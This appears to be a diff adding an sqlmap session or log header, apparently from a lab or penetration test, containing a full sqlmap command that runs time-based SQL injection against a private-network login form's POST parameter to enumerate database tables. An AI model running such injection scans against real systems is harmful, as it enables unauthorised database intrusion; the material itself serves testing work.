@@ -1,0 +1,3 @@
+http://192.168.145.48/index.php (POST)  # /usr/bin/sqlmap -u http://192.168.145.48/index.php --data=mail-list=test@test.com --technique=T --dbms=mysql --level=1 --risk=3 --batch -v 3 --tables --proxy=http://127.0.0.1:8080 --output sqlmap_results_2
+
+mail-list=test@test.com
